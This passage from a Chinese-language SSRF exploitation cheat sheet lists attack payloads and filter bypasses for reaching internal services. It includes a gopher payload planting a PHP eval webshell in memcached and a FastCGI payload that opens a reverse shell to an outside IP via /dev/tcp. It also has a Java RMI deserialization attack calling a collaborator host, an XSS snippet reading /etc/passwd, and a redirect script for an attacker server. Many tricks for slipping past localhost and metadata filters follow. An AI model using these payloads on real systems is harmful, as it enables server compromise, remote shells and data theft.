	gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
	gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
  ###### Apache Tomcat
  	默认绑定端口：80,443 (SSL),8080,8443 (SSL)
	https://github.com/pimps/gopher-tomcat-deployer
  ###### FastCGI
	默认绑定端口：80,443 (SSL)
	gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
  ###### Java RMI
  	默认绑定端口：1090,1098,1099,1199,4443-4446,8999-9010,9999
	$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
	[+] Creating ysoserial payload... done.
	[+]
	[+] Attempting deserialization attack on RMI Registry endpoint...
	[+]
	[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
  ##### SSRF到XSS
  	http://brutelogic.com.br/poc.svg -> simple alert
	https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf

	https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
  ##### XSS到SSRF
  ###### 使用 iframe
  	<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
cat attachment.bin
  ##### Bypass
  ###### 本地绕过
	http://127.0.0.1=http://localhost
  ###### 使用 HTTPS 绕过
	https://127.0.0.1/
	https://localhost/
  ###### [::]绕过
	http://[::]:80=http://127.0.0.1
	http://[::]:80/
	http://[::]:25/ SMTP
	http://[::]:22/ SSH
	http://[::]:3128/ Squid
	http://0000::1:80/
	http://0000::1:25/ SMTP
	http://0000::1:22/ SSH
	http://0000::1:3128/ Squid
  ###### @绕过
	http://www.xx.com/1.php?url=http://www.xx.com@127.0.0.1:8080
  ###### 利用短网址
	http://tool.chinaz.com/tools/dwz.aspx
	http://dwz.cn/
  ###### DNS解析
	http://spoofed.burpcollaborator.net
	http://localtest.me
	http://customer1.app.localhost.my.company.127.0.0.1.nip.io
	http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
	http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
	http://www.qq.com.127.0.0.1.xip.io，可解析为127.0.0.1
	自己域名设置A记录，指向127.0.0.1
  ###### 进制转换
	127.0.0.1
	八进制
	http://0177.0.0.1/ = http://127.0.0.1
	http://o177.0.0.1/ = http://127.0.0.1
	http://0o177.0.0.1/ = http://127.0.0.1
	http://q177.0.0.1/ = http://127.0.0.1
	十六进制：0x7f.0.0.1
	十进制
	http://2130706433/ = http://127.0.0.1
	http://3232235521/ = http://192.168.0.1
	http://3232235777/ = http://192.168.1.1
	http://2852039166/  = http://169.254.169.254
	http://www.bejson.com/convert/ip2int/
  ###### 句号
	127。0。0。1
  ###### 302脚本
	<?php
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	$scheme = $_GET['s'];
	$data = $_GET['data'];
	header("Location: $scheme://$ip:$port/$data");
	?>
	攻击方VPS监听8080
  ###### dict协议
	dict://www.attack.com:8080/hello:dict等于
	ssrf.php?url=http://attack.com/302.php?s=dict&ip=www.attack.com&port=8080&data=hello:dict
  ###### Gopher协议
	gopher:// www.attack.com:8080/gopher
	ssrf.php?url=http://attack.com/302.php?s=gopher&ip=www.attack.com&port=8080&data=gopher
  ###### File协议
	攻击机新建file.php
	<?php
	header("Location: file:///etc/passwd");
	?>
	ssrf.php?url=http://attack.com/file.php
  ###### 使用 CIDR 绕过
	http://127.127.127.127
	http://127.0.1.3
	http://127.0.0.0
  ###### 使用 IPv6/IPv4 地址嵌入绕过
	http://[0:0:0:0:0:ffff:127.0.0.1]
  ###### 使用格式错误的 url 绕过
  	localhost:+11211aaa
	localhost:00011211aaaa
  ###### 使用稀有地址绕过
  	http://0/
	http://127.1
	http://127.0.1
  ###### 使用 URL 编码绕过
  	http://127.0.0.1/%61dmin
	http://127.0.0.1/%2561dmin
  ###### 使用 bash 变量绕过
  	仅限CURL
	curl -v "http://evil$google.com"
	$google = ""
  ###### 使用技巧组合绕过
  	http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
	urllib2 : 1.1.1.1
	requests + browsers : 2.2.2.2
	urllib : 3.3.3.3
  ###### 使用封闭的字母数字绕过
  	http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
	List:
	① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
  ###### 使用 unicode 绕过
  	在某些语言（.NET、Python 3）中，正则表达式默认支持 unicode。 \d包括0123456789
  ###### 绕过php 函数filter_var() 
  	0://evil.com:80;http://google.com:80/ 
  ###### 绕过弱解析器
  	http://127.1.1.1:80\@127.2.2.2:80/
	http://127.1.1.1:80\@@127.2.2.2:80/
	http://127.1.1.1:80:\@@127.2.2.2:80/
	http://127.1.1.1:80#\@127.2.2.2:80/
  ###### 使用重定向绕过
  	1. 在白名单主机上创建一个页面，将请求重定向的SSRF到目标 URL（例如 192.168.0.1）
	2.启动 SSRF vulnerable.com/index.php?url=http://YOUR_SERVER_IP vulnerable.com将获取 YOUR_SERVER_IP 将重定向到 192.168.0.1
	3.您可以使用响应码[307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307)和[308](https://developer.mozilla.org/ en-US/docs/Web/HTTP/Status/308) 以便在重定向后保留 HTTP 方法。
  ###### 使用 type=url 绕过
  	把"type=file" 改为"type=url"
	在文本字段中粘贴 URL，然后按回车
	使用此漏洞，用户可以从任何图像URL上传图像 = 触发 SSRF
  ###### 使用 DNS 重新绑定 (TOCTOU) 绕过
  	创建一个在两个 IP 之间更改的域。 http://1u.ms/ 
	例如，要在 1.2.3.4 和 169.254-169.254 之间轮换，请使用以下域：
	make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
  ###### 使用 jar 协议绕过（仅限 java）
  	jar:scheme://domain/path!/ 
	jar:http://127.0.0.1!/
	jar:https://127.0.0.1!/
	jar:ftp://127.0.0.1!/